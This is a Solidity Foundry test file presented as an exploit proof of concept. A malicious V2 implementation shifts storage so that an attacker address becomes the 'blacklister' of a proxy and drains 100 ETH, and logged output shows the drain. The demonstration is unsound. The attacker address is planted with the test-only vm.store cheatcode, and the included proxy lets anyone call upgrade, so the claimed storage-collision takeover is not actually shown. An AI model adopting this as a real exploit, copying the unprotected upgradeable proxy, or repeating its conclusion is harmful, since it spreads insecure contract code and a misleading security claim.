// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// File: test/StorageCollisionPOC.t.sol
// Run: forge test --match-test testStorageCollision -vvvv

import "forge-std/Test.sol";

contract StorageCollisionPOC is Test {
    address constant OWNER = address(0x1);
    address constant TRUSTED_BLACKLISTER = address(0x2);
    address constant ATTACKER = address(0x1337);
    
    Proxy proxy;
    
    function setUp() public {
        proxy = new Proxy();
    }
    
    function testStorageCollision() public {
        console.log("\n========== STORAGE COLLISION EXPLOIT ==========");
        
        // ======== STEP 1: Deploy V1 ========
        console.log("\n[1] DEPLOYING V1");
        V1 v1 = new V1();
        proxy.upgrade(address(v1));
        
        // Initialize with trusted blacklister
        V1(payable(address(proxy))).initialize(TRUSTED_BLACKLISTER);
        
        // Fund the contract
        vm.deal(address(proxy), 100 ether);
        
        // Verify initial state
        address blacklisterV1 = V1(payable(address(proxy))).getBlacklister();
        console.log("Blacklister in V1:", blacklisterV1);
        assertEq(blacklisterV1, TRUSTED_BLACKLISTER, "Should be trusted blacklister");
        
        // Show raw storage
        bytes32 slot0 = vm.load(address(proxy), bytes32(uint256(0)));
        bytes32 slot1 = vm.load(address(proxy), bytes32(uint256(1)));
        console.log("Storage Slot 0:", vm.toString(slot0));
        console.log("Storage Slot 1:", vm.toString(slot1));
        
        // ======== STEP 2: Deploy Malicious V2 ========
        console.log("\n[2] DEPLOYING MALICIOUS V2");
        V2Malicious v2 = new V2Malicious();
        
        // Before upgrade, set attacker address in slot 1
        // (where V2 will read blacklister from)
        vm.store(address(proxy), bytes32(uint256(1)), bytes32(uint256(uint160(ATTACKER))));
        console.log("Injected attacker address into slot 1");
        
        // Upgrade to V2
        proxy.upgrade(address(v2));
        console.log("Upgraded to V2 (storage layout shifted)");
        
        // ======== STEP 3: Verify Storage Corruption ========
        console.log("\n[3] STORAGE CORRUPTION ACTIVE");
        
        // V2 reads blacklister from slot 1 (not slot 0!)
        address blacklisterV2 = V2Malicious(payable(address(proxy))).getBlacklister();
        console.log("Blacklister in V2:", blacklisterV2);
        console.log("Expected:", TRUSTED_BLACKLISTER);
        console.log("Actual:", ATTACKER);
        
        assertEq(blacklisterV2, ATTACKER, "EXPLOIT: Attacker is now blacklister!");
        
        // ======== STEP 4: Exploit ========
        console.log("\n[4] EXPLOITING");
        
        uint256 balanceBefore = ATTACKER.balance;
        console.log("Attacker balance before:", balanceBefore / 1e18, "ETH");
        console.log("Contract balance before:", address(proxy).balance / 1e18, "ETH");
        
        // Attacker drains contract
        vm.prank(ATTACKER);
        V2Malicious(payable(address(proxy))).emergencyWithdraw();
        
        uint256 balanceAfter = ATTACKER.balance;
        console.log("Attacker balance after:", balanceAfter / 1e18, "ETH");
        console.log("Contract balance after:", address(proxy).balance / 1e18, "ETH");
        
        assertEq(balanceAfter - balanceBefore, 100 ether, "Attacker stole all funds");
        assertEq(address(proxy).balance, 0, "Contract drained");
        
        console.log("\n  ATTACK SUCCESSFUL: Storage collision allowed complete takeover");
       
    }
}

// Minimal proxy for testing
contract Proxy {
    bytes32 private constant IMPLEMENTATION_SLOT =
        keccak256("proxy.implementation");

    function upgrade(address newImplementation) public {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }

    function _implementation() internal view returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    fallback() external payable {
        address impl = _implementation();

        assembly {
            calldatacopy(0, 0, calldatasize())

            let result := delegatecall(
                gas(),
                impl,
                0,
                calldatasize(),
                0,
                0
            )

            returndatacopy(0, 0, returndatasize())

            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

// V1: Original contract
contract V1 {
    // Storage layout:
    address private blacklister;  // Slot 0
    
    function initialize(address _blacklister) external {
        blacklister = _blacklister;
    }
    
    function getBlacklister() external view returns (address) {
        return blacklister;
    }
    
    function emergencyWithdraw() external {
        require(msg.sender == blacklister, "Not blacklister");
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    receive() external payable {}
}

// V2: Malicious contract with shifted storage
contract V2Malicious {
    // Storage layout (SHIFTED!):
    uint256 private exploitVar;   // Slot 0 (NEW!)
    address private blacklister;  // Slot 1 (was slot 0!)
    
    function getBlacklister() external view returns (address) {
        return blacklister;
    }
    
    function emergencyWithdraw() external {
        require(msg.sender == blacklister, "Not blacklister");
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    receive() external payable {}
}

```solidity
Logs:
  
========== STORAGE COLLISION EXPLOIT ==========
  
[1] DEPLOYING V1
  Blacklister in V1: 0x0000000000000000000000000000000000000002
  Storage Slot 0: 0x0000000000000000000000000000000000000000000000000000000000000002
  Storage Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000000
  
[2] DEPLOYING MALICIOUS V2
  Injected attacker address into slot 1
  Upgraded to V2 (storage layout shifted)
  
[3] STORAGE CORRUPTION ACTIVE
  Blacklister in V2: 0x0000000000000000000000000000000000001337
  Expected: 0x0000000000000000000000000000000000000002
  Actual: 0x0000000000000000000000000000000000001337
  
[4] EXPLOITING
  Attacker balance before: 0 ETH
  Contract balance before: 100 ETH
  Attacker balance after: 100 ETH
  Contract balance after: 0 ETH
  
  ATTACK SUCCESSFUL: Storage collision allowed complete takeover

```

